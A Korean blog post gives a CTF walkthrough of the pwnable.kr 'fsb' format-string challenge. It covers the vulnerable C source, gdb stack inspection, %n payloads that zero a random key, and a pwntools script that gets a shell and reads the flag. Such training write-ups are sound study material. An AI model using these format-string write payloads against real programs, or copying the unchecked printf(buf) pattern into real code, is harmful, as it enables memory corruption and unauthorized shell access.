---
title: 1st Problem - dowoo
date: 2018-12-13
tags: [pwnable]
author: arizona
type: post
---

### http://pwnable.kr - Rookiss - fsb 

{{<r "deadline">}} - 2018.12.18 {{<p "18:00">}}


딱봐도 문제가 format string bug.. ㅎㅎㅎ\
일단 소스코드를 보쟙 cat fsb.c !<br>

```c
#include <stdio.h>
#include <alloca.h>
#include <fcntl.h>

unsigned long long key;
char buf[100];
char buf2[100];

int fsb(char** argv, char** envp){
        char* args[]={"/bin/sh", 0};
        int i;

        char*** pargv = &argv;
        char*** penvp = &envp;
        char** arg;
        char* c;
        for(arg=argv;*arg;arg++) for(c=*arg; *c;c++) *c='\0';
        for(arg=envp;*arg;arg++) for(c=*arg; *c;c++) *c='\0';
        *pargv=0;
        *penvp=0;

        for(i=0; i<4; i++){
                printf("Give me some format strings(%d)\n", i+1);
                read(0, buf, 100);
                printf(buf);
        }

        printf("Wait a sec...\n");
        sleep(3);

        printf("key : \n");
        read(0, buf2, 100);
        unsigned long long pw = strtoull(buf2, 0, 10);
        if(pw == key){
                printf("Congratz!\n");
                execve(args[0], args, 0);
                return 0;
        }

        printf("Incorrect key \n");
        return 0;
}

int main(int argc, char* argv[], char** envp){

        int fd = open("/dev/urandom", O_RDONLY);
        if( fd==-1 || read(fd, &key, 8) != 8 ){
                printf("Error, tell admin\n");
                return 0;
        }
        close(fd);

        alloca(0x12345 & key);

        fsb(argv, envp); // exploit this format string bug!
        return 0;
}
```

우와우 ㅎㅎㅎㅎ 아주 길당 ㅎㅎ main 첫줄부터 보즈아!\
일단은..main 에서 O_RDONLY 는 읽기, O_WRONLY 는 쓰기, RDWR 는 읽기 쓰기 니깡..\
*read only* 로 /dev/urandom 파일을 읽어소 .. key 라는 전역변수에 값을 8바이트 저장!
읽기에 실패하거나.. read() 함수가 8바이트 저장을 몬한다면..(urandom 파일이 작을떄?) 에러 빼액\
다음.. alloca 함수는 , malloc 과 비스무리한 함순데.. heap 말고 stack 에 할당한다구행..
만약 buffer overflow 가 일어나면 문제가 되는 함수라.. 별로 쓰진 않는뎅!\
어쩃든.. 0x12345 와 key 를 and 연산한 만큼을 stack 에 할당.. 왜있지?;;\
그다음 fsb 함수를 보면.. argv(\*\*) 라는 포인터배열, envp(\*\*) 라는 이중포인터가 인자닷\
<br>
args(\*\*) 란 포인터 배열에, "/bin/sh"(\*),0 이라는.. 배열주소(\*) 하나와 NULL 값을 넣어준당! 
args[0] = "/bin/sh"
pargv(\*\*\*) 는, args(\*\*)의 주소고..envp 도 똑같이 하고,,for 문은
argv[0] 부터 시작해서.. `**argv` 가 `'\0'` 이 아니라면.. \*\*argv=argv[0][0]= '\0'
쭉쭉 .해서  결국 argv 초기화! 그다음포문은 envp 초기화!
args 라는 배열 포인터 마저 초기화! -> 배열 포인터로 받았기에 가능.. 
<br>
그다음 우리의 취약한 printf(buf) 가 나온다.. 이런거 요즘 누가쓰노?ㅠㅠ
쩃든 취약점은 허접하긴한데.. 이걸 4번이나 기회를 준다니.. 뚤릴것 같긴 한데 어떤방법이 있으까..??
쨋든,, 코드를 마져 보면 8바이트 짜리 전역변수 key 와,  나중에 입력받을 변수 pw 가 같으면 짜잔 하고 쉘 떨어진당. 따라서 key 에 써있는 값을 컨트롤 하는게 중요하겠디!

일단 buf 에 저장해서 그걸 printf 인자로 집어넣는 구조고.. 여기다가 %x 쓰면 고냥 \*(esp+4) 값이 톡 튀어나온다는 소리다. 일단 read 이전 함수에 break 를 걸어놓고 메모리 스택을 보자.

disas fsb 로 보면.. 

```sh
   0x080485e7 <+179>:   call   0x80483f0 <printf@plt>
   0x080485ec <+184>:   movl   $0x64,0x8(%esp)
   0x080485f4 <+192>:   movl   $0x804a100,0x4(%esp)
   0x080485fc <+200>:   movl   $0x0,(%esp)
   0x08048603 <+207>:   call   0x80483e0 <read@plt>
   0x08048608 <+212>:   mov    $0x804a100,%eax
   0x0804860d <+217>:   mov    %eax,(%esp)
   0x08048610 <+220>:   call   0x80483f0 <printf@plt>
   0x08048615 <+225>:   addl   $0x1,-0x1c(%ebp)
   0x08048619 <+229>:   cmpl   $0x3,-0x1c(%ebp)
```
요따구 어셈블리어가 있는데.. 딱 저기 부분인거 보이제?
그렇담 0x080485ec 에 브레이크 해놓고 보잡 b \*0x080485ec 

```sh
(gdb) x/50x $esp
0xffa03aa0:     0x08048878      0x00000001      0x00000000      0x00000000
0xffa03ab0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffa03ac0:     0x00000000      0x08048870      0x00000000      0x00000000
0xffa03ad0:     0xffa05c48      0xffa06fe9      0xffa03af0      0xffa03af4
0xffa03ae0:     0x00000000      0x00000000      0xffa05b48      0x08048791
0xffa03af0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffa03b00:     0x00000000      0x00000000      0x00000000      0x00000000
0xffa03b10:     0x00000000      0x00000000      0x00000000      0x00000000
0xffa03b20:     0x00000000      0x00000000      0x00000000      0x00000000
0xffa03b30:     0x00000000      0x00000000      0x00000000      0x00000000
0xffa03b40:     0x00000000      0x00000000      0x00000000      0x00000000
0xffa03b50:     0x00000000      0x00000000      0x00000000      0x00000000
0xffa03b60:     0x00000000      0x00000000
```

흠.. key 의 주소를 알아보쟙

```sh
(gdb) p &key
$1 = (<data variable, no debug info> *) 0x804a060 <key>
```

오옹이.. 여기서 그럼 0x804a60 이랑 0x804a64 이거 두부분을 덮으면 되니까.. %n 을 이용하려면,, 이 값이 메모리 어딘가에 써있어야겠네 일단.. 음??? 없잖아? ㅠㅠㅠ
다행이도 0xffa03ad8 부분 메모리가 0ffa03af0 이야 ㅠㅠ 이런게 없으면 우짜지.. 어쨋든 있으니까 이걸 써먹어보쟈. 음 일단 그럼 0xffa03af0 부분에 0x804a060 을 써넣어야겠지?

그렇다면,, 일단 이건 printf 의 ( esp - 0xffa03ad8 - 4 )/4 = 14 번째 페이크변수가 될태구,, 쓸 값은 0x804a060 = 134520928 이니까.. %134520928c%14$n 을 넣어주면 되겠따!!

아까 3번쨰 printf 밑 0x08048619 에 break 를 걸어놓고 입력해보즈아 !

앗 ㅎㅎ 근데 이거 실행할떄마다 esp 가 바껴서 조금 바꼈어 ㅎㅎㅎ 미안하다!!

```sh
0xffa79ca0:     0x0804a100      0x0804a100      0x00000064      0x00000000
0xffa79cb0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffa79cc0:     0x00000000      0x08048870      0x00000000      0x00000001
0xffa79cd0:     0xffa8a038      0xffa8bfe9      0xffa79cf0      0xffa79cf4
0xffa79ce0:     0x00000000      0x00000000      0xffa89f38      0x08048791
0xffa79cf0:     0x0804a060      0x00000000      0x00000000      0x00000000
0xffa79d00:     0x00000000      0x00000000      0x00000000      0x00000000
0xffa79d10:     0x00000000      0x00000000      0x00000000      0x00000000
0xffa79d20:     0x00000000      0x00000000      0x00000000      0x00000000
0xffa79d30:     0x00000000      0x00000000      0x00000000      0x00000000
0xffa79d40:     0x00000000      0x00000000      0x00000000      0x00000000
0xffa79d50:     0x00000000      0x00000000      0x00000000      0x00000000
0xffa79d60:     0x00000000      0x00000000
```

오우 잘들어갔엉 ! 그러면 이제 key 의 앞 4바이트를 때워보자. 마찬가지로 
( esp - 0xffa79cf0 - 4 )/4 = 20 번째니까, 여기다가 0 을 넣어서 key 를 0으로 만들어버리쟝!\
그러면 %20$n 을 넣으면 되것다!! 일단 넣기전 key 앞 4바이트 0x0804a060 값을 보면, 

```sh
(gdb) p *0x0804a060
$4 = -1282287952
```
요로코롬 돼있지? ㅎㅎ %20$n 넣어보고 다시 해보쟙!
```sh
(gdb) p *0x0804a060
$5 = 0
```

짜잔  0 됐따능 ! ㅎㅎ 밑에 4바이트도 바꿔보즈아. 당연하지만 +4 주소값이니까
%134520932c%14$n , %20$n 을 넣어주면 되것지?ㅎㅎ gdb 말고 진짜루 해보쟝.

파이썬으로 짜면 요따구야!

```python
from pwn import *
import time
shell = ssh("fsb", "pwnable.kr", password = "guest", port = 2222)
p = shell.run("/home/fsb/fsb")
p.sendline("%134520928c%14$n")
print(p.recvuntil("\n"))
print(p.recvuntil("\n"))
p.sendline("%20$n")
print(p.recvuntil("\n"))
print(p.recvuntil("\n"))
p.sendline("%134520932c%14$n")
print(p.recvuntil("\n"))
print(p.recvuntil("\n"))
p.sendline("%20$n")
p.interactive()
```

```sh
Wait a sec...
key :
0
Congratz!
$ id
uid=1046(fsb) gid=1046(fsb) egid=1047(fsb_pwn) groups=1047(fsb_pwn),1046(fsb)
```


짜잔 cat flag !
```sh
$ cat flag
Have you ever saw an example of utilizing [n] format character?? :(
```